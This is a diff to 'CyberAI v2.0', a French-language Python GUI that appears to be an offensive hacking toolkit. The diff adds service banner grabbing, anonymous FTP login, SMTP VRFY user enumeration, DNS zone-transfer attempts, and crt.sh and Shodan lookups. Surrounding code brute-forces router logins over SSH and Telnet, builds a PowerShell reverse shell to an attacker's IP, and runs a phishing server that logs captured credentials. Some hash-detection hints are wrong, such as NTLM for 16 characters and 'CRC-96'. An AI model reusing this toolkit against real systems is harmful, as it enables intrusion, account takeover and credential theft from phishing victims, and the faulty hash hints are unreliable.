@@ -9,12 +9,19 @@ import json
 import subprocess
 import random
 import string
+import queue
 import requests
 import curl_cffi.requests as curl_requests
 import whois
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor
 from urllib3.exceptions import InsecureRequestWarning
+import re
+import hashlib
+import base64
+import secrets
+import paramiko
+import telnetlib
 import tkinter as tk
 from tkinter import ttk, scrolledtext, messagebox, filedialog
 
@@ -246,6 +253,8 @@ class CyberAI(tk.Tk):
             "ip_after": 10,
             "randomize_order": False,
         }
+        self._log_queue = queue.Queue()
+        self._start_log_poller()
 
         notebook = ttk.Notebook(self)
         notebook.pack(fill=tk.BOTH, expand=True, padx=8, pady=(8, 0))
@@ -257,10 +266,12 @@ class CyberAI(tk.Tk):
             " Web ":       WebTab,
             " OSINT ":     OSINTTab,
             " Mots de passe ":  PasswordTab,
+            " Crypto ":    CryptoTab,
             " DoS ":       DoSTab,
             " Anonymat " : AnonymityTab,
             " Exploitation "   : ExploitTab,
             " Hameçonnage "  : PhishingTab,
+            " Reporting " : ReportingTab,
         }
 
         for name, cls in tab_classes.items():
@@ -279,6 +290,25 @@ class CyberAI(tk.Tk):
         ttk.Label(self.status_bar, text="CyberAI v2.0", foreground="gray").pack(side=tk.RIGHT, padx=5)
 
         self.protocol("WM_DELETE_WINDOW", self._on_close)
+
+    def _start_log_poller(self):
+        self.after(200, self._poll_log_queue)
+
+    def _poll_log_queue(self):
+        try:
+            while True:
+                widget, msg, tag = self._log_queue.get_nowait()
+                try:
+                    widget.insert(tk.END, msg + "\n", tag)
+                    widget.see(tk.END)
+                except tk.TclError:
+                    pass
+        except queue.Empty:
+            pass
+        try:
+            self.after(200, self._poll_log_queue)
+        except tk.TclError:
+            pass
 
     def update_tor_status(self):
         if self.tor.enabled:
@@ -303,7 +333,7 @@ class BaseTab:
         self.app = app
 
     def log(self, widget, msg, tag=None):
-        self.app.after(0, lambda: self._do_log(widget, msg, tag))
+        self.app._log_queue.put((widget, msg, tag))
 
     def _do_log(self, widget, msg, tag=None):
         try:
@@ -378,7 +408,9 @@ class NetworkTab(BaseTab):
         btn_frame = ttk.Frame(f)
         btn_frame.grid(row=1, column=0, columnspan=5, pady=5)
         ttk.Button(btn_frame, text="Scan", command=self.run_scan).pack(side=tk.LEFT, padx=5)
+        ttk.Button(btn_frame, text="Détecter Services", command=self.run_service_detect).pack(side=tk.LEFT, padx=5)
         ttk.Button(btn_frame, text="Ping", command=self.run_ping).pack(side=tk.LEFT, padx=5)
+        ttk.Button(btn_frame, text="Traceroute", command=self.run_traceroute).pack(side=tk.LEFT, padx=5)
         ttk.Button(btn_frame, text="Mon IP", command=self.run_my_ip).pack(side=tk.LEFT, padx=5)
 
         mac_frame = ttk.LabelFrame(main, text="Recherche MAC")
@@ -387,6 +419,13 @@ class NetworkTab(BaseTab):
         self.entry_mac = ttk.Entry(mac_frame, width=20, font=("TkDefaultFont", 11))
         self.entry_mac.pack(side=tk.LEFT, padx=5, pady=5)
         ttk.Button(mac_frame, text="Rechercher", command=self.run_mac_lookup).pack(side=tk.LEFT, padx=5, pady=5)
+
+        enum_frame = ttk.LabelFrame(main, text="Énumération")
+        enum_frame.pack(fill=tk.X, pady=(0, 8))
+        ttk.Button(enum_frame, text="FTP Anonyme", command=self.run_ftp_enum).pack(side=tk.LEFT, padx=5, pady=5)
+        ttk.Button(enum_frame, text="SMTP (VRFY)", command=self.run_smtp_enum).pack(side=tk.LEFT, padx=5, pady=5)
+        ttk.Button(enum_frame, text="DNS Enum", command=self.run_dns_enum).pack(side=tk.LEFT, padx=5, pady=5)
+        ttk.Label(enum_frame, text="Cible partagée avec le scan", foreground="gray").pack(side=tk.RIGHT, padx=10, pady=5)
 
         self.output = self.make_output(main)
 
@@ -403,7 +442,7 @@ class NetworkTab(BaseTab):
         self.log(self.output, f"Cible: {target} \u2192 {ip}", "bold")
         self.log(self.output, f"Scan en cours...\n")
 
-        ports = COMMON_PORTS if self.scan_type.get() == "common" else list(range(1, 1025 if self.scan_type.get() == "quick" else 65536))
+        ports = (COMMON_PORTS.copy() if self.scan_type.get() == "common" else list(range(1, 1025 if self.scan_type.get() == "quick" else 65536)))
         random.shuffle(ports)
 
         open_ports = []
@@ -482,6 +521,195 @@ class NetworkTab(BaseTab):
                 pass
         except Exception as e:
             self.log(self.output, f"  Erreur: {e}", "error")
+
+    # ── Service Detection ──
+    def run_service_detect(self):
+        self.clear(self.output)
+        target = self.entry_target.get().strip()
+        if not target:
+            messagebox.showwarning("Attention", "Entrez une cible.")
+            return
+        self.run_thread(lambda: self.do_service_detect(target))
+
+    def do_service_detect(self, target):
+        ip = resolve_target(target)
+        self.log(self.output, f"Détection de services sur {ip}...", "bold")
+        BANNER_PORTS = [21, 22, 23, 25, 80, 110, 143, 443, 445, 3306, 3389, 5432, 5900, 6379, 8080, 8443]
+        found = 0
+        for port in BANNER_PORTS:
+            if self.app.stealth.get("enabled"):
+                time.sleep(random.uniform(0.2, 0.5))
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(3)
+                if sock.connect_ex((ip, port)) != 0:
+                    sock.close()
+                    continue
+                service = get_service_name(port)
+                banner = b""
+                try:
+                    if port in (80, 8080, 8443):
+                        sock.sendall(f"GET / HTTP/1.0\r\nHost: {ip}\r\n\r\n".encode())
+                    elif port == 443:
+                        ctx = ssl.create_default_context()
+                        ctx.check_hostname = False
+                        ctx.verify_mode = ssl.CERT_NONE
+                        ssock = ctx.wrap_socket(sock, server_hostname=ip)
+                        ssock.settimeout(3)
+                        ssock.sendall(f"GET / HTTP/1.0\r\nHost: {ip}\r\n\r\n".encode())
+                        banner = ssock.recv(512)
+                        ssock.close()
+                        self.log(self.output, f"  {port}/TCP ({service}) — TLS actif", "success")
+                        found += 1
+                        continue
+                    banner = sock.recv(512).strip()
+                except:
+                    pass
+                sock.close()
+
+                if len(banner) > 0:
+                    try:
+                        banner_text = banner.decode("utf-8", errors="ignore").split("\n")[0].strip()[:100]
+                    except:
+                        banner_text = banner.hex()[:60]
+                    self.log(self.output, f"  {port}/TCP ({service}) — {banner_text}", "success")
+                else:
+                    self.log(self.output, f"  {port}/TCP ({service}) — ouvert (pas de bannière)", "success")
+                found += 1
+            except Exception as e:
+                pass
+        if found == 0:
+            self.log(self.output, "  Aucun service détecté.", "warning")
+        else:
+            self.log(self.output, f"\n{found} service(s) détecté(s).", "bold")
+
+    # ── Traceroute ──
+    def run_traceroute(self):
+        self.clear(self.output)
+        target = self.entry_target.get().strip()
+        if not target:
+            messagebox.showwarning("Attention", "Entrez une cible.")
+            return
+        self.run_thread(lambda: self.do_traceroute_net(target))
+
+    def do_traceroute_net(self, target):
+        host = target.split("://")[-1].split("/")[0]
+        self.log(self.output, f"Traceroute vers {host}:", "bold")
+        try:
+            if os.name == "nt":
+                result = subprocess.run(["tracert", "-h", "15", host], capture_output=True, text=True, timeout=20)
+            else:
+                result = subprocess.run(["traceroute", "-n", "-m", "15", host], capture_output=True, text=True, timeout=20)
+            if result.returncode == 0:
+                self.log(self.output, result.stdout)
+            else:
+                self.log(self.output, "  Traceroute non disponible.", "warning")
+        except FileNotFoundError:
+            self.log(self.output, "  traceroute/tracert non installé.", "warning")
+        except subprocess.TimeoutExpired:
+            self.log(self.output, "  Timeout.", "warning")
+        except Exception as e:
+            self.log(self.output, f"  Erreur: {e}", "error")
+
+    # ── FTP Anonymous Enum ──
+    def run_ftp_enum(self):
+        self.clear(self.output)
+        target = self.entry_target.get().strip()
+        if not target:
+            messagebox.showwarning("Attention", "Entrez une cible.")
+            return
+        self.run_thread(lambda: self.do_ftp_enum(target))
+
+    def do_ftp_enum(self, target):
+        ip = resolve_target(target)
+        self.log(self.output, f"Test FTP anonyme sur {ip}:21...", "bold")
+        try:
+            import ftplib
+            ftp = ftplib.FTP()
+            ftp.connect(ip, 21, timeout=5)
+            ftp.login("anonymous", "anonymous@test.com")
+            self.log(self.output, "  ✓ Accès FTP anonyme autorisé !", "success")
+            try:
+                files = ftp.nlst()
+                self.log(self.output, f"  Fichiers: {', '.join(files[:20])}")
+                if len(files) > 20:
+                    self.log(self.output, f"  ... et {len(files)-20} autres")
+            except:
+                self.log(self.output, "  (liste de fichiers non disponible)")
+            ftp.quit()
+        except ftplib.all_errors as e:
+            self.log(self.output, f"  FTP anonyme refusé: {e}", "warning")
+
+    # ── SMTP Enum ──
+    def run_smtp_enum(self):
+        self.clear(self.output)
+        target = self.entry_target.get().strip()
+        if not target:
+            messagebox.showwarning("Attention", "Entrez une cible.")
+            return
+        self.run_thread(lambda: self.do_smtp_enum(target))
+
+    def do_smtp_enum(self, target):
+        ip = resolve_target(target)
+        self.log(self.output, f"SMTP enum sur {ip}:25...", "bold")
+        users = ["admin", "root", "info", "support", "sales", "contact", "webmaster", "test", "user", "nobody"]
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            sock.connect((ip, 25))
+            banner = sock.recv(1024).decode("utf-8", errors="ignore")
+            self.log(self.output, f"  Bannière: {banner.strip()[:100]}")
+            sock.sendall(b"HELO cyberai\r\n")
+            sock.recv(512)
+
+            for user in users:
+                sock.sendall(f"VRFY {user}\r\n".encode())
+                resp = sock.recv(256).decode("utf-8", errors="ignore").strip()
+                if "252" in resp or "250" in resp:
+                    self.log(self.output, f"  ✓ {user} — existe ({resp})", "success")
+                elif "550" not in resp:
+                    self.log(self.output, f"  ? {user} — {resp}", "warning")
+            sock.sendall(b"QUIT\r\n")
+            sock.close()
+        except Exception as e:
+            self.log(self.output, f"  Erreur SMTP: {e}", "error")
+
+    # ── DNS Enum ──
+    def run_dns_enum(self):
+        self.clear(self.output)
+        target = self.entry_target.get().strip()
+        if not target:
+            messagebox.showwarning("Attention", "Entrez une cible.")
+            return
+        self.run_thread(lambda: self.do_dns_enum(target))
+
+    def do_dns_enum(self, target):
+        host = target.split("://")[-1].split("/")[0]
+        self.log(self.output, f"DNS Enumeration de {host}:", "bold")
+        record_types = ["A", "AAAA", "MX", "NS", "TXT", "SOA", "CNAME"]
+        for rtype in record_types:
+            try:
+                if os.name == "nt":
+                    result = subprocess.run(["nslookup", "-type=" + rtype, host], capture_output=True, text=True, timeout=5)
+                else:
+                    result = subprocess.run(["dig", "+short", host, rtype], capture_output=True, text=True, timeout=5)
+                output = result.stdout.strip()
+                if output:
+                    for line in output.split("\n"):
+                        line = line.strip()
+                        if line:
+                            self.log(self.output, f"  {rtype}: {line[:120]}", "success")
+            except:
+                pass
+        if os.name != "nt":
+            try:
+                result = subprocess.run(["dig", "+short", host, "AXFR"], capture_output=True, text=True, timeout=5)
+                if result.stdout.strip():
+                    self.log(self.output, "\n  ⚠ Zone Transfer (AXFR) possible !", "error")
+                    for line in result.stdout.strip().split("\n"):
+                        self.log(self.output, f"    {line}")
+            except:
+                pass
 
 
 # ════════════════════════ 2. ROUTER EXPLOIT ════════════════════════
@@ -568,14 +796,12 @@ class RouterTab(BaseTab):
                     if r.status_code == 200:
                         self.log(self.output, f"[HTTP] {user}:{pwd} \u2192 OK", "success")
                 elif port == 22:
-                    import paramiko
                     ssh = paramiko.SSHClient()
                     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                     ssh.connect(ip, port=port, username=user, password=pwd, timeout=5, look_for_keys=False, allow_agent=False)
                     self.log(self.output, f"[SSH] {user}:{pwd} \u2192 OK", "success")
                     ssh.close()
                 elif port == 23:
-                    import telnetlib
                     tn = telnetlib.Telnet(ip, port, timeout=3)
                     tn.read_until(b"login:", timeout=2)
                     tn.write(user.encode() + b"\n")
@@ -879,6 +1105,9 @@ class OSINTTab(BaseTab):
         ttk.Button(btn_frame, text="OSINT Complet", command=self.run_full).pack(side=tk.LEFT, padx=3)
         ttk.Button(btn_frame, text="Sous-domaines", command=self.run_subdomains).pack(side=tk.LEFT, padx=3)
         ttk.Button(btn_frame, text="GeoIP", command=self.run_geoip).pack(side=tk.LEFT, padx=3)
+        ttk.Button(btn_frame, text="Cert. Trans.", command=self.run_crtsh).pack(side=tk.LEFT, padx=3)
+        ttk.Button(btn_frame, text="Traceroute", command=self.run_traceroute).pack(side=tk.LEFT, padx=3)
+        ttk.Button(btn_frame, text="Shodan", command=self.run_shodan).pack(side=tk.LEFT, padx=3)
 
         self.output = self.make_output(main)
 
@@ -1036,6 +1265,104 @@ class OSINTTab(BaseTab):
         except Exception as e:
             self.log(self.output, f"  Erreur: {e}", "error")
 
+    # ── Certificate Transparency (crt.sh) ──
+    def run_crtsh(self):
+        self.clear(self.output)
+        t = self.get_target()
+        if not t:
+            return
+        self.run_thread(lambda: self.do_crtsh(t))
+
+    def do_crtsh(self, t):
+        self.log(self.output, f"Certificate Transparency pour {t}:", "bold")
+        try:
+            r = requests.get(f"https://crt.sh/?q={t}&output=json", timeout=15, headers={"User-Agent": "Mozilla/5.0"})
+            if r.status_code == 200:
+                data = r.json()
+                seen = set()
+                count = 0
+                for entry in data[:50]:
+                    name = entry.get("name_value", "")
+                    for n in name.split("\n"):
+                        n = n.strip().lower()
+                        if n and n not in seen:
+                            seen.add(n)
+                            self.log(self.output, f"  \u2713 {n}", "success")
+                            count += 1
+                self.log(self.output, f"\nTotal: {count} certificats/subdomaines trouvés.", "bold")
+            else:
+                self.log(self.output, f"  Erreur API: HTTP {r.status_code}", "warning")
+        except Exception as e:
+            self.log(self.output, f"  Erreur: {e}", "error")
+
+    # ── Traceroute ──
+    def run_traceroute(self):
+        self.clear(self.output)
+        t = self.get_target()
+        if not t:
+            return
+        self.run_thread(lambda: self.do_traceroute(t))
+
+    def do_traceroute(self, t):
+        self.log(self.output, f"Traceroute vers {t}:", "bold")
+        try:
+            host = t.split("://")[-1].split("/")[0]
+            param = "-n" if os.name == "nt" else "-n"
+            result = subprocess.run(
+                ["traceroute" if os.name != "nt" else "tracert", param, host],
+                capture_output=True, text=True, timeout=30
+            )
+            if result.returncode == 0:
+                self.log(self.output, result.stdout)
+            else:
+                result2 = subprocess.run(
+                    ["traceroute", "-n", "-m", "15", host],
+                    capture_output=True, text=True, timeout=15
+                )
+                if result2.returncode == 0:
+                    self.log(self.output, result2.stdout)
+                else:
+                    self.log(self.output, "Traceroute non disponible.", "warning")
+        except FileNotFoundError:
+            self.log(self.output, "  Traceroute non installé.", "warning")
+        except subprocess.TimeoutExpired:
+            self.log(self.output, "  Timeout.", "warning")
+        except Exception as e:
+            self.log(self.output, f"  Erreur: {e}", "error")
+
+    # ── Shodan ──
+    def run_shodan(self):
+        self.clear(self.output)
+        t = self.get_target()
+        if not t:
+            return
+        self.run_thread(lambda: self.do_shodan(t))
+
+    def do_shodan(self, t):
+        self.log(self.output, f"Shodan lookup pour {t}:", "bold")
+        ip = resolve_target(t)
+        api_key = "YOUR_SHODAN_API_KEY"
+        try:
+            r = requests.get(f"https://api.shodan.io/shodan/host/{ip}?key={api_key}", timeout=10)
+            if r.status_code == 200:
+                data = r.json()
+                self.log(self.output, f"  IP: {data.get('ip_str', ip)}", "success")
+                self.log(self.output, f"  Organisation: {data.get('org', 'N/A')}")
+                self.log(self.output, f"  OS: {data.get('os', 'N/A')}")
+                self.log(self.output, f"  Ports ouverts: {', '.join(str(p) for p in data.get('ports', []))}")
+                for service in data.get('data', [])[:5]:
+                    port = service.get('port', '?')
+                    transport = service.get('transport', '?')
+                    product = service.get('product', 'Inconnu')
+                    self.log(self.output, f"    {port}/{transport} - {product}")
+            elif r.status_code == 403:
+                self.log(self.output, "  API key invalide. Configurez votre clé Shodan.", "warning")
+                self.log(self.output, "  (Éditez 'YOUR_SHODAN_API_KEY' dans do_shodan)", "warning")
+            else:
+                self.log(self.output, f"  Erreur: HTTP {r.status_code}", "warning")
+        except Exception as e:
+            self.log(self.output, f"  Erreur: {e}", "error")
+
 
 # ════════════════════════ 5. PASSWORD ANALYSIS ════════════════════════
 class PasswordTab(BaseTab):
@@ -1080,9 +1407,10 @@ class PasswordTab(BaseTab):
         ttk.Radiobutton(hf, text="MD5", variable=self.hash_type, value="MD5").grid(row=0, column=2, padx=2)
         ttk.Radiobutton(hf, text="SHA1", variable=self.hash_type, value="SHA1").grid(row=0, column=3, padx=2)
         ttk.Radiobutton(hf, text="SHA256", variable=self.hash_type, value="SHA256").grid(row=0, column=4, padx=2)
+        ttk.Button(hf, text="Détecter", command=self.run_detect_hash, width=10).grid(row=0, column=5, padx=5)
 
         btn_hf = ttk.Frame(hf)
-        btn_hf.grid(row=1, column=0, columnspan=5, pady=5)
+        btn_hf.grid(row=1, column=0, columnspan=6, pady=5)
         ttk.Button(btn_hf, text="Crack (int\u00e9gr\u00e9)", command=self.run_crack_hash).pack(side=tk.LEFT, padx=3)
         ttk.Label(btn_hf, text="Wordlist:").pack(side=tk.LEFT, padx=(10, 2))
         self.entry_wordlist = ttk.Entry(btn_hf, width=30)
@@ -1168,8 +1496,6 @@ class PasswordTab(BaseTab):
         self.run_thread(lambda: self.do_generate(length))
 
     def do_generate(self, length):
-        import secrets
-        import string
         chars = string.ascii_letters + string.digits + "!@#$%^&*()_+-="
         pwd = "".join(secrets.choice(chars) for _ in range(length))
         self.log(self.output, f"Mot de passe g\u00e9n\u00e9r\u00e9 ({length} caract\u00e8res):", "bold")
@@ -1178,6 +1504,55 @@ class PasswordTab(BaseTab):
         self.entry_pwd.insert(0, pwd)
 
     # ── Hash Cracker ──
+    def run_detect_hash(self):
+        self.clear(self.output)
+        h = self.entry_hash.get().strip()
+        if not h:
+            messagebox.showwarning("Attention", "Entrez un hash à détecter.")
+            return
+        self.run_thread(lambda: self.do_detect_hash(h))
+
+    def do_detect_hash(self, h):
+        self.log(self.output, f"Détection du type de hash: {h}", "bold")
+        h = h.strip()
+        length = len(h)
+        char_set = set(h)
+        is_hex = all(c in "0123456789abcdef" for c in h.lower())
+        is_b64 = all(c in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=" for c in h)
+
+        self.log(self.output, f"  Longueur: {length} caractères")
+        self.log(self.output, f"  Hexadécimal: {'Oui' if is_hex else 'Non'}")
+        self.log(self.output, f"  Base64: {'Oui' if is_b64 else 'Non'}")
+
+        hash_db = {
+            32:  ("MD5", "MD5 (128 bits)"),
+            40:  ("SHA1", "SHA-1 (160 bits)"),
+            56:  ("SHA224", "SHA-224 (224 bits)"),
+            64:  ("SHA256", "SHA-256 (256 bits)"),
+            96:  ("SHA384", "SHA-384 (384 bits)"),
+            128: ("SHA512", "SHA-512 (512 bits)"),
+        }
+
+        if is_hex and length in hash_db:
+            algo, desc = hash_db[length]
+            self.log(self.output, f"  → {desc} détecté !", "success")
+            self.hash_type.set(algo)
+        elif length == 60 and h.startswith("$2"):
+            self.log(self.output, "  → bcrypt ($2a$/$2b$/$2y$) détecté !", "success")
+            self.log(self.output, "  (Craquage bcrypt non intégré — utilisez hashcat)", "warning")
+            self.hash_type.set("SHA256")
+        elif length == 40 and not is_hex:
+            self.log(self.output, "  → Possible SHA1 (base64) détecté", "warning")
+            self.hash_type.set("SHA1")
+        elif length == 16:
+            self.log(self.output, "  → Possible MySQL3 / NTLM (128 bits, hex)", "warning")
+            self.log(self.output, "  → Essayez aussi CRC-96", "warning")
+        elif length == 20:
+            self.log(self.output, "  → Possible MySQL5 / SHA-1 (base64?)", "warning")
+        else:
+            self.log(self.output, "  Type inconnu ou custom. Essayez les modes manuels.", "warning")
+        self.log(self.output, "\nAstuce: utilisez hashcat pour les hash non supportés ici.", "bold")
+
     def run_crack_hash(self):
         self.clear(self.output)
         h = self.entry_hash.get().strip()
@@ -1187,7 +1562,6 @@ class PasswordTab(BaseTab):
         self.run_thread(lambda: self.do_crack_hash(h))
 
     def do_crack_hash(self, h):
-        import hashlib
         self.log(self.output, f"Tentative de craquage du hash: {h}", "bold")
         algo = self.hash_type.get()
         self.log(self.output, f"Algorithme: {algo}\n")
@@ -1237,7 +1611,6 @@ class PasswordTab(BaseTab):
         self.run_thread(lambda: self.do_crack_file(h, fpath))
 
     def do_crack_file(self, h, fpath):
-        import hashlib
         algo = self.hash_type.get()
         self.log(self.output, f"Craquage avec wordlist: {fpath}", "bold")
         self.log(self.output, f"Hash: {h} ({algo})\n")
@@ -1281,7 +1654,6 @@ class PasswordTab(BaseTab):
         self.run_thread(lambda: self.do_generate_hash(pwd))
 
     def do_generate_hash(self, pwd):
-        import hashlib
         self.log(self.output, f"Hashes pour: {pwd}", "bold")
         self.log(self.output, f"  MD5:    {hashlib.md5(pwd.encode()).hexdigest()}")
         self.log(self.output, f"  SHA1:   {hashlib.sha1(pwd.encode()).hexdigest()}")
@@ -2046,7 +2418,6 @@ class ExploitTab(BaseTab):
         self.log(self.output, "\n\u2139\ufe0f Collez/ex\u00e9cutez sur la cible, puis \u00e9coutez avec nc.", "bold")
 
     def _ps_b64(self, ip, port):
-        import base64
         code = (
             f"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});"
             f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
@@ -2684,29 +3055,16 @@ class PhishingTab(BaseTab):
 
     def _poll_captured(self):
         seen = set()
-        srv = self.server
-        while srv and srv.server:
+        while self.server and self.server.server:
             time.sleep(1)
             try:
-                for item in srv.get_captured():
+                for item in self.server.get_captured():
                     if item not in seen:
                         seen.add(item)
-                        self.app.after(0, lambda i=item: self._display_captured(i))
+                        self.log(self.log_text, f"[{datetime.now().strftime('%H:%M:%S')}] Nouveau!\n{item}", "cred")
+                        self.log(self.output, "Identifiants captur\u00e9s ! Voir onglet Hame\u00e7onnage.", "success")
             except:
                 break
-
-    def _display_captured(self, item):
-        from urllib.parse import unquote
-        parts = item.split("&")
-        self.log_text.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] Nouveau!\n", "cred")
-        for p in parts:
-            if "=" in p:
-                k, v = p.split("=", 1)
-                v = unquote(v)
-                self.log_text.insert(tk.END, f"  {k}: {v}\n", "cred")
-        self.log_text.insert(tk.END, "-" * 50 + "\n")
-        self.log_text.see(tk.END)
-        self.log(self.output, "Identifiants captur\u00e9s !", "success")
 
     def _get_local_ip(self):
         try:
@@ -2726,6 +3084,749 @@ class PhishingTab(BaseTab):
         self.btn_stop.config(state=tk.DISABLED)
         self.lbl_status.config(text="\u25cf Arr\u00eat\u00e9", foreground="red")
         self.log(self.output, "Serveur arr\u00eat\u00e9.", "warning")
+
+
+# ════════════════════════ 10. CRYPTO ════════════════════════
+class CryptoTab(BaseTab):
+    def __init__(self, parent, app):
+        super().__init__(parent, app)
+        self.build()
+
+    def build(self):
+        main = ttk.Frame(self.parent)
+        main.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+
+        nb = ttk.Notebook(main)
+        nb.pack(fill=tk.BOTH, expand=True)
+
+        # ── Tab 1: Hash ──
+        hf = ttk.Frame(nb)
+        nb.add(hf, text="Hachage")
+        self._build_hash_tab(hf)
+
+        # ── Tab 2: AES ──
+        af = ttk.Frame(nb)
+        nb.add(af, text="AES")
+        self._build_aes_tab(af)
+
+        # ── Tab 3: RSA ──
+        rf = ttk.Frame(nb)
+        nb.add(rf, text="RSA")
+        self._build_rsa_tab(rf)
+
+        # ── Tab 4: Base64 ──
+        bf = ttk.Frame(nb)
+        nb.add(bf, text="Base64")
+        self._build_b64_tab(bf)
+
+        # ── Tab 5: Stéganographie ──
+        sf = ttk.Frame(nb)
+        nb.add(sf, text="Stéganographie")
+        self._build_stego_tab(sf)
+
+        self.output = self.make_output(main)
+
+    def _build_hash_tab(self, parent):
+        f = ttk.LabelFrame(parent, text="Calculateur de Hash")
+        f.pack(fill=tk.X, padx=8, pady=8)
+
+        ttk.Label(f, text="Texte:").grid(row=0, column=0, padx=5, pady=4, sticky="nw")
+        self.hash_input = scrolledtext.ScrolledText(f, height=4, width=70, font=("Consolas", 9))
+        self.hash_input.grid(row=0, column=1, columnspan=4, padx=5, pady=4)
+
+        ttk.Label(f, text="Algorithme:").grid(row=1, column=0, padx=5, pady=4, sticky="w")
+        self.hash_algo = tk.StringVar(value="SHA256")
+        algos_frame = ttk.Frame(f)
+        algos_frame.grid(row=1, column=1, columnspan=4, padx=5, pady=4, sticky="w")
+        for algo in ["MD5", "SHA1", "SHA256", "SHA512", "SHA3-256", "BLAKE2b"]:
+            ttk.Radiobutton(algos_frame, text=algo, variable=self.hash_algo, value=algo).pack(side=tk.LEFT, padx=3)
+
+        ttk.Button(f, text="Calculer Hash", command=self.run_hash_text, width=20).grid(row=2, column=1, pady=6)
+        ttk.Button(f, text="Hacher Fichier", command=self.run_hash_file, width=20).grid(row=2, column=2, pady=6)
+
+    def _build_aes_tab(self, parent):
+        f = ttk.LabelFrame(parent, text="Chiffrement AES-256-CBC")
+        f.pack(fill=tk.X, padx=8, pady=8)
+
+        ttk.Label(f, text="Clé (32 caractères):").grid(row=0, column=0, padx=5, pady=4, sticky="w")
+        self.aes_key = ttk.Entry(f, width=40, font=("Consolas", 9))
+        self.aes_key.grid(row=0, column=1, columnspan=3, padx=5, pady=4, sticky="ew")
+        ttk.Button(f, text="Générer", command=self.gen_aes_key, width=10).grid(row=0, column=4, padx=5)
+
+        ttk.Label(f, text="IV (16 caractères):").grid(row=1, column=0, padx=5, pady=4, sticky="w")
+        self.aes_iv = ttk.Entry(f, width=40, font=("Consolas", 9))
+        self.aes_iv.grid(row=1, column=1, columnspan=3, padx=5, pady=4, sticky="ew")
+        ttk.Button(f, text="Générer", command=self.gen_aes_iv, width=10).grid(row=1, column=4, padx=5)
+
+        ttk.Label(f, text="Données:").grid(row=2, column=0, padx=5, pady=4, sticky="nw")
+        self.aes_input = scrolledtext.ScrolledText(f, height=4, width=70, font=("Consolas", 9))
+        self.aes_input.grid(row=2, column=1, columnspan=4, padx=5, pady=4)
+
+        btnf = ttk.Frame(f)
+        btnf.grid(row=3, column=0, columnspan=5, pady=6)
+        ttk.Button(btnf, text="Chiffrer", command=self.run_aes_encrypt, width=15).pack(side=tk.LEFT, padx=3)
+        ttk.Button(btnf, text="Déchiffrer", command=self.run_aes_decrypt, width=15).pack(side=tk.LEFT, padx=3)
+        ttk.Button(btnf, text="Chiffrer Fichier", command=self.run_aes_encrypt_file, width=18).pack(side=tk.LEFT, padx=3)
+        ttk.Button(btnf, text="Déchiffrer Fichier", command=self.run_aes_decrypt_file, width=18).pack(side=tk.LEFT, padx=3)
+
+    def _build_rsa_tab(self, parent):
+        f = ttk.LabelFrame(parent, text="Génération de clés RSA")
+        f.pack(fill=tk.X, padx=8, pady=8)
+
+        ttk.Label(f, text="Taille:").grid(row=0, column=0, padx=5, pady=4, sticky="w")
+        self.rsa_size = tk.StringVar(value="2048")
+        for sz in ["1024", "2048", "4096"]:
+            ttk.Radiobutton(f, text=sz, variable=self.rsa_size, value=sz).grid(row=0, column=1 + ["1024","2048","4096"].index(sz), padx=3)
+
+        ttk.Button(f, text="Générer une paire de clés", command=self.run_rsa_gen, width=28).grid(row=0, column=4, padx=10)
+        ttk.Button(f, text="Chiffrer (pubkey)", command=self.run_rsa_encrypt, width=18).grid(row=1, column=1, pady=4)
+        ttk.Button(f, text="Déchiffrer (privkey)", command=self.run_rsa_decrypt, width=18).grid(row=1, column=2, pady=4)
+
+        ttk.Label(f, text="Message:").grid(row=2, column=0, padx=5, pady=4, sticky="nw")
+        self.rsa_input = scrolledtext.ScrolledText(f, height=3, width=70, font=("Consolas", 9))
+        self.rsa_input.grid(row=2, column=1, columnspan=5, padx=5, pady=4)
+
+        ttk.Label(f, text="Clé publique:").grid(row=3, column=0, padx=5, pady=2, sticky="nw")
+        self.rsa_pub = scrolledtext.ScrolledText(f, height=3, width=70, font=("Consolas", 8))
+        self.rsa_pub.grid(row=3, column=1, columnspan=5, padx=5, pady=2)
+
+        ttk.Label(f, text="Clé privée:").grid(row=4, column=0, padx=5, pady=2, sticky="nw")
+        self.rsa_priv = scrolledtext.ScrolledText(f, height=3, width=70, font=("Consolas", 8))
+        self.rsa_priv.grid(row=4, column=1, columnspan=5, padx=5, pady=2)
+
+    def _build_b64_tab(self, parent):
+        f = ttk.LabelFrame(parent, text="Encoder / Décoder Base64")
+        f.pack(fill=tk.X, padx=8, pady=8)
+
+        ttk.Label(f, text="Données:").grid(row=0, column=0, padx=5, pady=4, sticky="nw")
+        self.b64_input = scrolledtext.ScrolledText(f, height=6, width=70, font=("Consolas", 9))
+        self.b64_input.grid(row=0, column=1, columnspan=3, padx=5, pady=4)
+
+        btnf = ttk.Frame(f)
+        btnf.grid(row=1, column=0, columnspan=4, pady=6)
+        ttk.Button(btnf, text="Encoder → Base64", command=self.run_b64_encode, width=18).pack(side=tk.LEFT, padx=3)
+        ttk.Button(btnf, text="Décoder ← Base64", command=self.run_b64_decode, width=18).pack(side=tk.LEFT, padx=3)
+        ttk.Button(btnf, text="Encoder Fichier", command=self.run_b64_encode_file, width=18).pack(side=tk.LEFT, padx=3)
+        ttk.Button(btnf, text="Décoder → Fichier", command=self.run_b64_decode_file, width=18).pack(side=tk.LEFT, padx=3)
+
+    def _build_stego_tab(self, parent):
+        f = ttk.LabelFrame(parent, text="Stéganographie LSB (images PNG)")
+        f.pack(fill=tk.X, padx=8, pady=8)
+
+        ttk.Label(f, text="Image:").grid(row=0, column=0, padx=5, pady=4, sticky="w")
+        self.stego_path = ttk.Entry(f, width=50)
+        self.stego_path.grid(row=0, column=1, padx=5, pady=4, sticky="ew")
+        ttk.Button(f, text="Parcourir", command=self.browse_stego_image, width=12).grid(row=0, column=2, padx=5)
+
+        ttk.Label(f, text="Message caché:").grid(row=1, column=0, padx=5, pady=4, sticky="nw")
+        self.stego_msg = scrolledtext.ScrolledText(f, height=3, width=70, font=("Consolas", 9))
+        self.stego_msg.grid(row=1, column=1, columnspan=3, padx=5, pady=4)
+
